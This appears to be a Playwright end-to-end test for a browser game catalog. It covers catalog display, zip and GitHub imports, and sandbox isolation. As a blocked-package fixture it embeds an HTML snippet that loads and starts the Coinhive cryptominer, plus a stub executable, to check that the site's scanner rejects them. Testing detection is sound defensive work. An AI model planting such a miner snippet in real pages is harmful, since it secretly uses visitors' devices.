// Run: PLAYWRIGHT=<playwright module url> node tests/e2e-ui.mjs [--net]
// Drives the real page: catalog, player, GitHub import (--net), zip upload, and a blocked package.
import http from 'node:http';
import { readFile, mkdtemp, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { extname, join, normalize } from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFileSync } from 'node:child_process';
import assert from 'node:assert/strict';

const root = join(fileURLToPath(import.meta.url), '..', '..');
const net = process.argv.includes('--net');
const { chromium } = await import(process.env.PLAYWRIGHT || 'playwright');
const types = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml' };
const server = http.createServer(async (req, res) => {
  try { const p = normalize(decodeURIComponent(req.url.split('?')[0])); const b = await readFile(join(root, p === '/' || p === '\\' ? 'index.html' : p)); res.writeHead(200, { 'content-type': types[extname(p)] || 'text/html' }); res.end(b); }
  catch { res.writeHead(404); res.end(); }
}).listen(4182);

// Build two zips with Python's zipfile (real deflate).
const dir = await mkdtemp(join(tmpdir(), 'zy-'));
const GAME = `<!doctype html><title>Zip Game</title><canvas id=c width=320 height=200></canvas><script src="js/game.js"></script>`;
const GAMEJS = `const x=document.getElementById('c').getContext('2d');let n=0,score=0,lives=3;addEventListener('keydown',()=>score++);
(function f(){n++;x.fillStyle='hsl('+n%360+',70%,50%)';x.fillRect(n%280,20,30,30);requestAnimationFrame(f)})();`;
const MINER = `<!doctype html><canvas id=c></canvas><script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var m=new CoinHive.Anonymous('k');m.start();</script>`;
await writeFile(join(dir, 'mk.py'), `
import zipfile,sys
d=sys.argv[1]
with zipfile.ZipFile(d+'/good.zip','w',zipfile.ZIP_DEFLATED) as z:
    z.writestr('mygame-main/index.html', ${JSON.stringify(GAME)})
    z.writestr('mygame-main/js/game.js', ${JSON.stringify(GAMEJS)})
    z.writestr('mygame-main/README.md', 'hi')
with zipfile.ZipFile(d+'/bad.zip','w',zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.html', ${JSON.stringify(MINER)})
    z.writestr('setup.exe', b'MZ\\x90\\x00')
`);
execFileSync('python3', [join(dir, 'mk.py'), dir]);

const browser = await chromium.launch();
const page = await browser.newPage({ viewport: { width: 1280, height: 900 } });
const errors = [];
page.on('pageerror', e => errors.push(e.message));
let failed = 0;
const step = async (name, fn) => { try { await fn(); console.log('ok   ', name); } catch (e) { failed++; console.log('FAIL ', name, '\n     ', String(e.message).split('\n').slice(0, 4).join('\n      ')); } };

await page.goto('http://127.0.0.1:4182/');
await step('catalog shows playable cards', async () => {
  await page.waitForSelector('.game-card');
  const n = await page.locator('.game-card').count(); assert.ok(n >= 1, 'cards: ' + n);
  const label = await page.locator('.play-label').first().textContent(); assert.match(label, /PLAY/);
});
await step('catalog card opens the in-page player', async () => {
  await page.locator('.game-card').first().click();
  const here = page.locator('#playHere');
  if (await here.isVisible()) { await here.click(); await page.waitForSelector('#playerDialog[open] iframe'); assert.ok(await page.locator('#playerTitle').textContent()); }
  await page.locator('#playerClose').click().catch(() => {});
  await page.keyboard.press('Escape');
});
await step('removed features stay removed', async () => {
  assert.equal(await page.locator('[data-access=files], [data-access=source], [data-shelf=Favorites], .save-button').count(), 0);
});

async function openAdd() { await page.locator('#submitTop').click(); await page.waitForSelector('#labDialog[open]'); }
async function chooseTab(name) { await page.locator(`[data-labtab=${name}]`).click(); }

await step('bad zip is blocked and cannot be added', async () => {
  await openAdd(); await chooseTab('upload');
  await page.setInputFiles('#pickFile', join(dir, 'bad.zip'));
  await page.waitForSelector('.lab-verdict.bad');
  const head = await page.locator('#labVerdict b').textContent(); assert.match(head, /Blocked/);
  assert.equal(await page.locator('#labAdd').count(), 0, 'no add button for a blocked package');
  const text = await page.locator('#labReport').textContent(); assert.match(text, /miner/i); assert.match(text, /exe/i);
  await page.keyboard.press('Escape');
});

await step('good zip: scan, sandbox test, add, play', async () => {
  await openAdd(); await chooseTab('upload');
  await page.setInputFiles('#pickFile', join(dir, 'good.zip'));
  await page.waitForSelector('#labStage iframe');
  await page.waitForFunction(() => /Looks like a game|Caution/.test(document.querySelector('#labVerdict b')?.textContent || ''), null, { timeout: 20000 });
  await page.waitForFunction(() => !document.querySelector('#labAdd').disabled, null, { timeout: 5000 });
  await page.locator('#labTitle').fill('Zip Game');
  await page.locator('#labAdd').click();
  await page.waitForFunction(() => document.querySelector('#countLocal').textContent === '1');
  await page.locator('.game-card').first().click();
  await page.locator('#playHere').click();
  await page.waitForSelector('#playerStage iframe');
  await page.waitForTimeout(1500);
  const frame = page.frames().find(f => f !== page.mainFrame());
  assert.ok(frame, 'sandbox frame exists');
  const info = await frame.evaluate(() => ({ canvas: !!document.getElementById('c'), title: document.title, draws: document.getElementById('c').getContext('2d') != null }));
  assert.ok(info.canvas, JSON.stringify(info));
  // The frame must not be able to reach the Zylith page.
  const reach = await frame.evaluate(() => { try { return typeof parent.document.title; } catch (e) { return 'blocked'; } });
  assert.equal(reach, 'blocked');
  await page.locator('#playerClose').click();
});

await step('stored game survives a reload and can be deleted', async () => {
  await page.reload(); await page.waitForSelector('.game-card');
  await page.waitForFunction(() => document.querySelector('#countLocal').textContent === '1');
  await page.locator('[data-access=local]').click();
  await page.locator('.game-card').first().click();
  page.once('dialog', d => d.accept());
  await page.locator('#deleteLocal').click();
  await page.waitForFunction(() => document.querySelector('#countLocal').textContent === '0');
});

if (net) {
  await step('GitHub import: 2048 runs in the sandbox', async () => {
    await openAdd();
    await page.locator('#ghInput').fill('https://github.com/gabrielecirulli/2048');
    await page.locator('#ghForm button[type=submit]').click();
    await page.waitForSelector('#labStage iframe', { timeout: 30000 });
    await page.waitForFunction(() => /Looks like a game|Caution/.test(document.querySelector('#labVerdict b')?.textContent || ''), null, { timeout: 25000 });
    const frame = page.frames().find(f => f !== page.mainFrame());
    const tiles = await frame.evaluate(() => document.querySelectorAll('.tile').length);
    assert.ok(tiles >= 2, 'tiles: ' + tiles);
    await page.keyboard.press('Escape');
  });
  await step('GitHub import: repo with no web build is rejected kindly', async () => {
    await openAdd();
    await page.locator('#ghInput').fill('https://github.com/HarbourMasters/Shipwright');
    await page.locator('#ghForm button[type=submit]').click();
    await page.waitForSelector('.lab-verdict.bad, .lab-status.err', { timeout: 40000 });
    const t = (await page.locator('#labReport').textContent()) + (await page.locator('#labStatus').textContent()); console.log('      ->', t.slice(0, 140));
    assert.match(t, /native source code|Not a runnable web game|Could not|too big/i);
    await page.keyboard.press('Escape');
  });
}

assert.deepEqual(errors, [], 'page errors: ' + errors.join(' | '));
await browser.close(); server.close();
process.exit(failed ? 1 : 0);
